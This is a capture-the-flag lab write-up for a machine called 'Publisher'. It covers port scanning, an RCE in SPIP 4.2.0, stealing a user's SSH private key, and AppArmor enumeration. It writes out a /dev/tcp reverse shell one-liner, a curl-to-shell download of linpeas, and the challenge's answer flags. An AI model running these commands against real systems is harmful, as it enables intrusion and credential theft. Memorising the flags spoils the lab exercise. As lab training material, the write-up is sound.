# Publisher

### Publisher
(Flags can be found at the end of this writeup)<br />
Initial scan: 

    nmap -n -Pn -v --min-rate=1000 -p- 10.10.99.134                        
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 15:29 EDT
    Initiating Connect Scan at 15:29
    Scanning 10.10.99.134 [65535 ports]
    Discovered open port 80/tcp on 10.10.99.134
    Discovered open port 22/tcp on 10.10.99.134
    Completed Connect Scan at 15:30, 35.15s elapsed (65535 total ports)
    Nmap scan report for 10.10.99.134
    Host is up (0.066s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
The website seems to be a magazine about SPIP, which is a content management system:<br />
![image](https://github.com/user-attachments/assets/3585d3d3-4012-498c-8ef6-d19183aa252c)<br />
Directory enumeration gives some results:<br />
![image](https://github.com/user-attachments/assets/968f056c-f9f0-40df-a0da-9edf2a8d864a)<br />
Moving to /spip, wappalyzer shows us that the server is running SPIP 4.2.0.<br />
![image](https://github.com/user-attachments/assets/53ff1363-7149-4f70-89e5-970d7776838e)<br />
Searching online I found that this version is vulnerable to unauthenticated RCE. The code for the exploit can be found in `exploit.py` of this folder. To run it, first base64 encode the following string `sh -i >& /dev/tcp/10.11.85.53/4444 0>&1`. The payload should look something like `echo base64string | base64 -d | bash`.<br />
So set up a netcat listener and run the following:<br />
![image](https://github.com/user-attachments/assets/9ba6e70e-2f29-4664-96fc-4f65c4523afe)<br />
The `think` user has a .ssh folder from which we can copy the private key. <br />
![image](https://github.com/user-attachments/assets/8d7a5cdc-ee53-45b0-b6ca-4af8eb096c7a)<br />
So, create an `id_rsa` file containing the private key, change it's permissions so that it can be used to access the machine with `chmod 600 id_rsa`. Finally log in with `ssh -i id_rsa think@target_IP`.<br />
![image](https://github.com/user-attachments/assets/efa2fd4e-2e40-4a34-b2b2-b0a2b20ef370)<br />
Very good, now let's see if we can get root aswell. 
The target machine doesn't have Internet access. However I transfered linpeas from my machine to the target using curl. On the attackbox where linpeas is located, run `python3 -m http.server 80`, on the target run `curl http://machine_IP/linpeas.sh | sh`. <br />
![image](https://github.com/user-attachments/assets/79156063-6f23-4360-9e96-81a5d88801a5)<br />
The very first thing I see is that app armor is being used to harden the system. This is why I had some troubles running the reverse shell before. This user is not able to write files anywhere or access specific folders that are usually accessible without app armor. <br />
The `think` user has /usr/sbin/ash as shell, which we can see is restricted by apparmor. For example when I tried to tranfer linpeas inside /tmp, it didn't work and this is why. <br />
The configuration of apparmor for the "ash" shell is the following:<br />
![image](https://github.com/user-attachments/assets/a1200f6d-a823-403c-86e1-22e304809591)<br />
![image](https://github.com/user-attachments/assets/b34e1773-e569-4055-9ec3-10a4fd8c3f0b)<br />
![image](https://github.com/user-attachments/assets/2502575c-3574-4180-853f-5bcc57a7c352)<br />



- What is the user flag? `fa229046d44eda6a3598c73ad96f4ca5 `
- What is the root flag? `3a4225cc9e85709adda6ef55d6a4f2ca`

